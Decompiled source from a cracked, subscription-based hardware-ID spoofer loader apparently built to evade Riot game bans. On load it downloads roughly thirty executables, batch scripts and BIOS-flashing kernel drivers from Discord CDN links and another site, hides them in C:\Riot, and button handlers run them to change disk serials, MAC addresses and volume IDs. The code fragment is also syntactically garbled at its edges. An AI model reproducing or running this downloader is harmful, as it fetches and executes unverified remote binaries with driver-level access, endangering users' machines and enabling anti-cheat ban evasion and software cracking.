Namespace Cracked by Cosmic X
{
// Token: 0x060001BA RID: 442 RVA: 0x00009EA4 File Offset: 0x000080A4
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void GForm4_Load(object sender, EventArgs e)
		{
			this.Label1.Text = "You still have " + Class1.Forms.Login.DiasVIP + " subscription days to enjoy.";
			if (Class1.Computer.FileSystem.DirectoryExists("C:\\Riot\\"))
			{
				Directory.Delete("C:\\Riot\\", true);
				Interaction.MsgBox("다시 로드", MsgBoxStyle.Information, "restart loader - drivers applied");
				ProjectData.EndApp();
				return;
			}
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983555108426096650/vava1.bat", "C:\\Riot\\Cleaner\\vava1.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983555636472188958/DLL.exe", "C:\\Riot\\DLL.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983555777673437244/mac.exe", "C:\\Riot\\Mac\\mac.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983556208160039012/1.exe", "C:\\Riot\\System\\1.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983556208394928138/sfbnrfn5mh.exe", "C:\\Riot\\System\\sfbnrfn5mh.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983761531152007258/OS.bat", "C:\\Riot\\Beta\\OS.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983559849952559194/productkey.bat", "C:\\Riot\\Beta\\productkey.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983559850145480724/user.txt", "C:\\Riot\\Beta\\user.txt");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983559850405556274/Volumeid.exe", "C:\\Riot\\Beta\\Volumeid.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983559850657194034/Volumeid64.exe", "C:\\Riot\\Beta\\Volumeid64.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983559851001118780/host.txt", "C:\\Riot\\Beta\\host.txt");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983559851546390548/mac.txt", "C:\\Riot\\Beta\\mac.txt");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983762036750180373/AMIDEWIN.EXE", "C:\\Riot\\Drivers\\AMIDEWIN.EXE");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983762036980854824/AMIDEWINx64.exe", "C:\\Riot\\Drivers\\AMIDEWINx64.exe");
			Class1.Computer.Network.DownloadFile("https://nerves.gg/woof/ILLUSIONCHANGER.exe", "C:\\Riot\\Drivers\\ILLUSIONCHANGER.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983852509124784138/RUN_exec.bat", "C:\\Riot\\Pinga\\RUN_exec.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983569060056940544/Volumeid.exe", "C:\\Riot\\Drivers\\Volumeid.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983569060363116554/Volumeid64.exe", "C:\\Riot\\Drivers\\Volumeid64.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983569060686082068/amide.sys", "C:\\Riot\\Drivers\\amide.sys");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983569059251617832/amifldrv32.sys", "C:\\Riot\\Drivers\\amifldrv32.sys");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983569059494891560/amifldrv64.sys", "C:\\Riot\\Drivers\\amifldry64.sys");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983761077873573918/vava2.bat", "C:\\Riot\\Cleaner\\vava2.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983761077689020476/vava3.bat", "C:\\Riot\\Cleaner\\vava3.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983770310803353630/HardDiskSerialNumberChanger.exe", "C:\\Riot\\System\\HardDiskSerialNumberChanger.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/982033194738151434/983771094504841246/Serial_checker_1.bat", "C:\\Riot\\Serial_checker_1.bat");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983852494440517733/AMIDEWIN.EXE", "C:\\Riot\\Pinga\\AMIDEWIN.EXE");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983852494683791440/AMIDEWINx64.exe", "C:\\Riot\\Pinga\\AMIDEWINx64.exe");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983852494935437332/amifldrv64.sys", "C:\\Riot\\Pinga\\amifldrv64.sys");
			Class1.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/981598111854112828/983852495170334740/amide.sys", "C:\\Riot\\Pinga\\amide.sys");
			DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Riot\\");
			DirectoryInfo directoryInfo2 = new DirectoryInfo("C:\\Riot\\Mac\\");
			DirectoryInfo directoryInfo3 = new DirectoryInfo("C:\\Riot\\System\\");
			DirectoryInfo directoryInfo4 = new DirectoryInfo("C:\\Riot\\Cleaner\\");
			DirectoryInfo directoryInfo5 = new DirectoryInfo("C:\\Riot\\Drivers\\");
			DirectoryInfo directoryInfo6 = new DirectoryInfo("C:\\Riot\\Beta\\");
			FileSystemInfo fileSystemInfo = new DirectoryInfo("C:\\Riot\\Pinga\\");
			directoryInfo.Attributes = FileAttributes.Hidden;
			directoryInfo2.Attributes = FileAttributes.Hidden;
			directoryInfo3.Attributes = FileAttributes.Hidden;
			directoryInfo4.Attributes = FileAttributes.Hidden;
			directoryInfo5.Attributes = FileAttributes.Hidden;
			directoryInfo6.Attributes = FileAttributes.Hidden;
			fileSystemInfo.Attributes = FileAttributes.Hidden;
			FileInfo fileInfo = new FileInfo("C:\\Riot\\Cleaner\\vava1.bat");
			FileInfo fileInfo2 = new FileInfo("C:\\Riot\\DLL.exe");
			FileInfo fileInfo3 = new FileInfo("C:\\Riot\\Mac\\mac.exe");
			FileInfo fileInfo4 = new FileInfo("C:\\Riot\\System\\1.exe");
			FileInfo fileInfo5 = new FileInfo("C:\\Riot\\System\\sfbnrfn5mh.exe");
			FileInfo fileInfo6 = new FileInfo("C:\\Riot\\Beta\\OS.bat");
			FileInfo fileInfo7 = new FileInfo("C:\\Riot\\Beta\\productkey.bat");
			FileInfo fileInfo8 = new FileInfo("C:\\Riot\\Drivers\\ILLUSIONCHANGER.exe");
			FileInfo fileInfo9 = new FileInfo("C:\\Riot\\Pinga\\RUN_exec.bat");
			FileInfo fileInfo10 = new FileInfo("C:\\Riot\\Cleaner\\vava2.bat");
			FileInfo fileInfo11 = new FileInfo("C:\\Riot\\Cleaner\\vava3.bat");
			FileInfo fileInfo12 = new FileInfo("C:\\Riot\\System\\HardDiskSerialNumberChanger.exe");
			FileSystemInfo fileSystemInfo2 = new FileInfo("C:\\Riot\\Serial_checker_1.bat");
			fileInfo.Attributes = FileAttributes.Hidden;
			fileInfo2.Attributes = FileAttributes.Hidden;
			fileInfo3.Attributes = FileAttributes.Hidden;
			fileInfo4.Attributes = FileAttributes.Hidden;
			fileInfo5.Attributes = FileAttributes.Hidden;
			fileInfo6.Attributes = FileAttributes.Hidden;
			fileInfo7.Attributes = FileAttributes.Hidden;
			fileInfo8.Attributes = FileAttributes.Hidden;
			fileInfo9.Attributes = FileAttributes.Hidden;
			fileInfo10.Attributes = FileAttributes.Hidden;
			fileInfo11.Attributes = FileAttributes.Hidden;
			fileInfo12.Attributes = FileAttributes.Hidden;
			fileSystemInfo2.Attributes = FileAttributes.Hidden;
		}

		// Token: 0x060001BB RID: 443 RVA: 0x00002FA6 File Offset: 0x000011A6
		private void method_2(object sender, EventArgs e)
		{
			Process.Start("C:\\Riot\\Mac\\mac.exe");
		}

		// Token: 0x060001BC RID: 444 RVA: 0x00002FB3 File Offset: 0x000011B3
		private void method_3(object sender, EventArgs e)
		{
			this.Button3.Enabled = false;
			this.Button5.Enabled = true;
			Process.Start("C:\\Riot\\DLL.exe");
			Process.Start("C:\\Riot\\Beta\\productkey.bat");
			Process.Start("C:\\Riot\\Beta\\OS.bat");
		}

		// Token: 0x060001BD RID: 445 RVA: 0x00002FEE File Offset: 0x000011EE
		private void method_4(object sender, EventArgs e)
		{
			this.Button5.Enabled = false;
			this.Button4.Enabled = true;
			Process.Start("C:\\Riot\\Pinga\\RUN_exec.bat");
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00003013 File Offset: 0x00001213
		private void method_5(object sender, EventArgs e)
		{
			this.Button6.Enabled = true;
			this.Button4.Enabled = false;
			Process.Start("C:\\Riot\\Drivers\\ILLUSIONCHANGER.exe");
		}

		// Token: 0x060001BF RID: 447 RVA: 0x00003038 File Offset: 0x00001238
		private void method_6(object sender, EventArgs e)
		{
			this.Button6.Enabled = false;
			this.Button7.Enabled = true;
			Process.Start("C:\\Riot\\System\\sfbnrfn5mh.exe");
			Process.Start("C:\\Riot\\System\\1.exe");
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x00003068 File Offset: 0x00001268
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void method_7(object sender, EventArgs e)
		{
			Directory.Delete("C:\\Riot\\", true);
			Interaction.MsgBox("Restart your computer and flash your BIOS.", MsgBoxStyle.Information, "xD");
			ProjectData.EndApp();
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x00002CE4 File Offset: 0x00000EE4
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void method_8(object sender, EventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x0000308C File Offset: 0x0000128C
		private void method_9(object sender, EventArgs e)
		{
			Process.Start("C:\\Riot\\Cleaner\\vava2.bat");
			this.Button10.Enabled = false;
			this.Button9.Enabled = true;
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x000030B1 File Offset: 0x000012B1
		private void method_10(object sender, EventArgs e)
		{
			Process.Start("C:\\Riot\\Cleaner\\vava3.bat");
			this.Button9.Enabled = false;
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x00002CEB File Offset: 0x00000EEB
		private void method_11(object sender, EventArgs e)
		{
			Process.Start("https://nerves.gg/");
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x000030CA File Offset: 0x000012CA
		private void method_12(object sender, EventArgs e)
		{
			Process.Start("C:\\Riot\\System\\HardDiskSerialNumberChanger.exe");
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x00002B44 File Offset: 0x00000D44
		private void method_13(object sender, EventArgs e)
		{
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x000030D7 File Offset: 0x000012D7
		private void method_14(object sender, EventArgs e)
		{
			Process.Start("C:\\Riot\\Serial_checker_1.bat");
		}

		// Token: 0x040000C0 RID: 192
		private IContainer components;
	}
    }
}
